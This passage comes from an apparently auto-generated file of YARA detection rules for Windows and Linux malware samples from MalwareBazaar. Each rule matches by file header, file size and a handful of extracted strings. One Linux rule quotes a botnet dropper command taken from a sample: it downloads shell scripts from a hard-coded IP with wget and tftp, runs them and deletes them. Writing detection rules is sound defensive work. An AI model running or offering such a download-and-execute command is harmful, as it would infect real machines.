        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Init>b__4_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 23KB
        and all of them
}

rule Windows_71fba6519b70623172170c020fc75c855669922971e09bd94c2ed4d21655334a
{
    meta:
        description = "Auto ML: 71fba6519b70623172170c020fc75c855669922971e09bd94c2ed4d21655334a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "ACQPPRh"
        $s5 = "eAQ7PQh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB
        and all of them
}

rule Linux_721fa43eb953cbda4bce3c6a4a84fd4e56965ffe9afd7ff8cdb8ac35ecf1d487
{
    meta:
        description = "Auto ML: 721fa43eb953cbda4bce3c6a4a84fd4e56965ffe9afd7ff8cdb8ac35ecf1d487"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "EBUPX!0"
        $s2 = "f+p:YDh"
        $s3 = "S`@rrI"
        $s4 = "{<PA4`5A?C2D"
        $s5 = "VS3VS["

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Linux_00d1ba77f0d593cd12960d553490a22f5e9b9154a5af549e5f7003a4a62d1207
{
    meta:
        description = "Auto ML: 00d1ba77f0d593cd12960d553490a22f5e9b9154a5af549e5f7003a4a62d1207"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "I<Gw{*Zn1"
        $s2 = "V+h}*BF"
        $s3 = "F5JX^Gw"
        $s4 = "nnID6)"
        $s5 = "YSg<0|j"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Windows_0b1802c98ca323c87cdb2f64b9165e73ca6a505cbc9f8273c14d0a71df0fa769
{
    meta:
        description = "Auto ML: 0b1802c98ca323c87cdb2f64b9165e73ca6a505cbc9f8273c14d0a71df0fa769"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 36KB
        and all of them
}

rule Windows_723d9539fcce3f6558051ac7fe5cd3848e057891bd562d090f860ef475922373
{
    meta:
        description = "Auto ML: 723d9539fcce3f6558051ac7fe5cd3848e057891bd562d090f860ef475922373"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = ",HjaU 5"
        $s4 = ";rke [Yx"
        $s5 = "\"Y N/)ja}z"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB
        and all of them
}

rule Linux_725683b249e23ec55e5fc458971de13f5057e853ed71206cb32c75a1248021cd
{
    meta:
        description = "Auto ML: 725683b249e23ec55e5fc458971de13f5057e853ed71206cb32c75a1248021cd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@VU<CRN"
        $s2 = "ug\\u|E"
        $s3 = "OnxP(AP"
        $s4 = "@ht$LV"
        $s5 = "9CCCLv"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_72ce7e97ea68b817452d8e25f7070623450828230a1c21d640b6f888d3cf29fc
{
    meta:
        description = "Auto ML: 72ce7e97ea68b817452d8e25f7070623450828230a1c21d640b6f888d3cf29fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2312KB
        and all of them
}

rule Windows_72e6aecc1e7172bb885e9454ae448965526b1cecfa6324a03e6c890b464f3533
{
    meta:
        description = "Auto ML: 72e6aecc1e7172bb885e9454ae448965526b1cecfa6324a03e6c890b464f3533"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "(yGrg~"
        $s5 = "(Ahmn(g"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4385KB
        and all of them
}

rule Windows_73116da30f395c43e5c2d0ec688c1d11932d82a9db6733fa1b563ef377aa679e
{
    meta:
        description = "Auto ML: 73116da30f395c43e5c2d0ec688c1d11932d82a9db6733fa1b563ef377aa679e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "SVWu:ff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1669KB
        and all of them
}

rule Windows_731919b308730b743aaac49f719a402faa76afcfb3d0d52412a1cd1b399b4fbb
{
    meta:
        description = "Auto ML: 731919b308730b743aaac49f719a402faa76afcfb3d0d52412a1cd1b399b4fbb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".edata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "StringX"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 42KB
        and all of them
}

rule Linux_7362348a80fb103636d133cf71ee6eee603ce3c3ecc1168b8715885b595a5fdf
{
    meta:
        description = "Auto ML: 7362348a80fb103636d133cf71ee6eee603ce3c3ecc1168b8715885b595a5fdf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "xTc808c"
        $s2 = "UIX(}JJx"
        $s3 = "UjX(}kRx"
        $s4 = "}kJx}JZx"
        $s5 = "}kJxUj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB
        and all of them
}

rule Windows_7381e44bceb1a34fe308780ad1aca1bf5298ef5fcad8e3a1fde188755bcc333e
{
    meta:
        description = "Auto ML: 7381e44bceb1a34fe308780ad1aca1bf5298ef5fcad8e3a1fde188755bcc333e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "DRich="
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "jXh SC"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB
        and all of them
}

rule Windows_739390cb2a8719293c06192017f6164ed68e569f5d259de14f17e9b6dee8ea44
{
    meta:
        description = "Auto ML: 739390cb2a8719293c06192017f6164ed68e569f5d259de14f17e9b6dee8ea44"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4013KB
        and all of them
}

rule Windows_73c156ea9e0695256567a9f2b6a140f9758423880f971b20d5e9e2875a9ca036
{
    meta:
        description = "Auto ML: 73c156ea9e0695256567a9f2b6a140f9758423880f971b20d5e9e2875a9ca036"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15861KB
        and all of them
}

rule Windows_0b36e4a25748a1daf0dbe1ed9b8ccd7208a0be2a536a14272771c8deff11d65d
{
    meta:
        description = "Auto ML: 0b36e4a25748a1daf0dbe1ed9b8ccd7208a0be2a536a14272771c8deff11d65d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich/O"
        $s3 = "PEC2NO"
        $s4 = "8VVVVV"
        $s5 = "AAGGf;"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 462KB
        and all of them
}

rule Windows_73d6607a9a76899ca834a89586e2700d8e49306bc5a788a1868558a6944e5e6e
{
    meta:
        description = "Auto ML: 73d6607a9a76899ca834a89586e2700d8e49306bc5a788a1868558a6944e5e6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2052KB
        and all of them
}

rule Linux_73e54277221abfde9d86dee8e4b5ede6ace8ab062c13055d360b89c1b63e42f4
{
    meta:
        description = "Auto ML: 73e54277221abfde9d86dee8e4b5ede6ace8ab062c13055d360b89c1b63e42f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "eV|Uz~"
        $s2 = "j g^Fg"
        $s3 = "A%fUI3_"
        $s4 = "V&qleV"
        $s5 = "bq_(pI3O"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Windows_73ffa7003c0e0aecd5a4a681fc9d47d67ecae138a01b365cb7869461477a5705
{
    meta:
        description = "Auto ML: 73ffa7003c0e0aecd5a4a681fc9d47d67ecae138a01b365cb7869461477a5705"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6505KB
        and all of them
}

rule Windows_740b85d585c17b7530d733fea1d42b015805cd4a2a2a277679632ddc3d37e1bf
{
    meta:
        description = "Auto ML: 740b85d585c17b7530d733fea1d42b015805cd4a2a2a277679632ddc3d37e1bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6289KB
        and all of them
}

rule Windows_741f858f958dbf16c5eba258ebf662a13a028d215fc12aec3eaef0c715bd496a
{
    meta:
        description = "Auto ML: 741f858f958dbf16c5eba258ebf662a13a028d215fc12aec3eaef0c715bd496a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "wPY sY"
        $s5 = "Yf a^UIX"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 374KB
        and all of them
}

rule Linux_7425590963b7709a9ec28d07527cf9b8c458eaf750be2593a0479bcc8c6fd6e6
{
    meta:
        description = "Auto ML: 7425590963b7709a9ec28d07527cf9b8c458eaf750be2593a0479bcc8c6fd6e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "x}d[x}%KxK"
        $s2 = "x}%KxH"
        $s3 = "}f[x}GSxH"
        $s4 = "x}'KxH"
        $s5 = "}CSx}d[x|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB
        and all of them
}

rule Windows_746241f529aaf3c70038d80361028190ffa56df2af2d0c4139852f4bf76a1b21
{
    meta:
        description = "Auto ML: 746241f529aaf3c70038d80361028190ffa56df2af2d0c4139852f4bf76a1b21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "D$PQRP"
        $s5 = "D$hRPQ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 824KB
        and all of them
}

rule Windows_747513c56f77acab5f84605d75866e33fc6e070a11e56a28887c5e75ef1edb2d
{
    meta:
        description = "Auto ML: 747513c56f77acab5f84605d75866e33fc6e070a11e56a28887c5e75ef1edb2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2372KB
        and all of them
}

rule Windows_74766a1208fef54924f04e8524b6576df7027f2cb1157b985955c827280597d3
{
    meta:
        description = "Auto ML: 74766a1208fef54924f04e8524b6576df7027f2cb1157b985955c827280597d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 911KB
        and all of them
}

rule Linux_74b94b31f0a31c1586096cfcab4502e97971031cbddf03319633183ae3e11130
{
    meta:
        description = "Auto ML: 74b94b31f0a31c1586096cfcab4502e97971031cbddf03319633183ae3e11130"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Pqc$hj"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 196KB
        and all of them
}

rule Windows_0b480e28f0bfa9f30a19b0b6ee89acd3a1e962a8718414225928685a26059636
{
    meta:
        description = "Auto ML: 0b480e28f0bfa9f30a19b0b6ee89acd3a1e962a8718414225928685a26059636"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 9031KB
        and all of them
}

rule Windows_74df3452a6b9dcdba658af7a9cf5afb09cce51534f9bc63079827bf73075243b
{
    meta:
        description = "Auto ML: 74df3452a6b9dcdba658af7a9cf5afb09cce51534f9bc63079827bf73075243b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".gfids"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 707KB
        and all of them
}

rule Windows_74e12bbc91af27f079f6c39e0a3600f7c9a203c3ee996dda09c863dbde0e86dc
{
    meta:
        description = "Auto ML: 74e12bbc91af27f079f6c39e0a3600f7c9a203c3ee996dda09c863dbde0e86dc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "QHH#0Rt"
        $s5 = "j\"=let"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 778KB
        and all of them
}

rule Windows_751597396e020f0bc9c02049fba72290571f6ade9b2c079f33bf1e70f99a30f6
{
    meta:
        description = "Auto ML: 751597396e020f0bc9c02049fba72290571f6ade9b2c079f33bf1e70f99a30f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 619KB
        and all of them
}

rule Windows_751657b09e8419dcfc90b0e44932dee1a4117ce9cd73cf652aa52c348a391f82
{
    meta:
        description = "Auto ML: 751657b09e8419dcfc90b0e44932dee1a4117ce9cd73cf652aa52c348a391f82"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 821KB
        and all of them
}

rule Windows_756c48b8e22d22eaf24ad8c69928bcf1cbb08e63ef897eac21366f4f6bd2c403
{
    meta:
        description = "Auto ML: 756c48b8e22d22eaf24ad8c69928bcf1cbb08e63ef897eac21366f4f6bd2c403"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8258KB
        and all of them
}

rule Windows_75856ab2df478c5cdf8088b6a2c26aca319637171ab7995a3628e5d251816b8d
{
    meta:
        description = "Auto ML: 75856ab2df478c5cdf8088b6a2c26aca319637171ab7995a3628e5d251816b8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB
        and all of them
}

rule Linux_75e82f4867f4ec24244c4757beadeaa3222c88b0dca648e5e77ef1b1af4cceac
{
    meta:
        description = "Auto ML: 75e82f4867f4ec24244c4757beadeaa3222c88b0dca648e5e77ef1b1af4cceac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "H!$Jud0"
        $s2 = "ff4Jfg"
        $s3 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s4 = "ad34334in"
        $s5 = "us534534534er"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 135KB
        and all of them
}

rule Linux_75f6172c7ebe95e418db8a0cd444e2e6056c3fca118c140693ed8b8ffae607ea
{
    meta:
        description = "Auto ML: 75f6172c7ebe95e418db8a0cd444e2e6056c3fca118c140693ed8b8ffae607ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "XEUPX!"
        $s2 = "LPg}\\QU"
        $s3 = "%rPSzCs|"
        $s4 = "I.S$SrvY"
        $s5 = "PPL$ F"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB
        and all of them
}

rule Windows_761769e8b5c01c04e5c611cb03657ab3b1ff1ed83498f6035dd59d4a779c8643
{
    meta:
        description = "Auto ML: 761769e8b5c01c04e5c611cb03657ab3b1ff1ed83498f6035dd59d4a779c8643"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "IRDIqlpfE"
        $s5 = "HBAzQiV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 697KB
        and all of them
}

rule Windows_7664ff83558a7141b89d83842fca07c9b6f4d377967c20b7237e1fa50e6f7f4e
{
    meta:
        description = "Auto ML: 7664ff83558a7141b89d83842fca07c9b6f4d377967c20b7237e1fa50e6f7f4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Reheats"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB
        and all of them
}

rule Linux_0b598088d167fb7164ac44ff6ec04bc8d4ef8b7299502db3120ebb1e1e9440b5
{
    meta:
        description = "Auto ML: 0b598088d167fb7164ac44ff6ec04bc8d4ef8b7299502db3120ebb1e1e9440b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "CskC~!"
        $s4 = "OSpW#Ap.3"
        $s5 = "lVU+;'i!"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB
        and all of them
}

rule Windows_768f163ce8833ca05034b25efccba215b2b69f3bfb9f43bd2b43569dfc03fd8b
{
    meta:
        description = "Auto ML: 768f163ce8833ca05034b25efccba215b2b69f3bfb9f43bd2b43569dfc03fd8b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "InnoMsI"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4701KB
        and all of them
}

rule Windows_76b3c31e85744ca236f9963da6fa3bc70a7c92ac5c1f19afcbeb61f17966837d
{
    meta:
        description = "Auto ML: 76b3c31e85744ca236f9963da6fa3bc70a7c92ac5c1f19afcbeb61f17966837d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "ZXIS8f"
        $s4 = "ZXIS8,"
        $s5 = "c`XGR8"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1392KB
        and all of them
}

rule Windows_76efda6c81b51a09ca94c5aa645cf08d2bf876cc0ead4855ba57582bb32bcb2d
{
    meta:
        description = "Auto ML: 76efda6c81b51a09ca94c5aa645cf08d2bf876cc0ead4855ba57582bb32bcb2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "RegDeleteKeyExW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 622KB
        and all of them
}

rule Windows_76f5084bca22085b3c76484470899bcb77f86d41208d354cacd8129f0b464b00
{
    meta:
        description = "Auto ML: 76f5084bca22085b3c76484470899bcb77f86d41208d354cacd8129f0b464b00"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhr4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB
        and all of them
}

rule Windows_76fb1494f160bb15a94de3401187fa0f4e64c1cff9a4dad27f0b24a8c8786950
{
    meta:
        description = "Auto ML: 76fb1494f160bb15a94de3401187fa0f4e64c1cff9a4dad27f0b24a8c8786950"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "{K5Rich"
        $s3 = "`.data"
        $s4 = ".pdata"
        $s5 = "@.idata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 205KB
        and all of them
}

rule Windows_76fcc7de4d18b697a31318fd75ccffcda3afc056756aea7019e44d32b95c68c9
{
    meta:
        description = "Auto ML: 76fcc7de4d18b697a31318fd75ccffcda3afc056756aea7019e44d32b95c68c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "B.symtab"
        $s5 = "8cpu.u"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15290KB
        and all of them
}

rule Windows_77430aa81eed0b76a3630f65f2767fc50cd097872eedbbd9487ba251bf991246
{
    meta:
        description = "Auto ML: 77430aa81eed0b76a3630f65f2767fc50cd097872eedbbd9487ba251bf991246"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3023KB
        and all of them
}

rule Windows_7761e6403caabbe4742e7afaf1be7dbf908974fd6d9f8367ca44352ea79a96a7
{
    meta:
        description = "Auto ML: 7761e6403caabbe4742e7afaf1be7dbf908974fd6d9f8367ca44352ea79a96a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3844KB
        and all of them
}

rule Windows_778040234f0fff43b162eb437530346d9ce7a5ddc700f416079db81c844f8f4f
{
    meta:
        description = "Auto ML: 778040234f0fff43b162eb437530346d9ce7a5ddc700f416079db81c844f8f4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6687KB
        and all of them
}

rule Windows_77860a4e448e5bd7c51518fbd24c0e7516ebc5bfbcafafcc2552be4781d1d282
{
    meta:
        description = "Auto ML: 77860a4e448e5bd7c51518fbd24c0e7516ebc5bfbcafafcc2552be4781d1d282"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6289KB
        and all of them
}

rule Windows_0b5a6b652547d225e983046733875ca231e167766c9944e5c35a50ffdcc5a2a3
{
    meta:
        description = "Auto ML: 0b5a6b652547d225e983046733875ca231e167766c9944e5c35a50ffdcc5a2a3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3041KB
        and all of them
}

rule Windows_779645914bf2b4b7d085520366334ca0c2b3467e078ba4a67a350ee51b14249d
{
    meta:
        description = "Auto ML: 779645914bf2b4b7d085520366334ca0c2b3467e078ba4a67a350ee51b14249d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3817KB
        and all of them
}

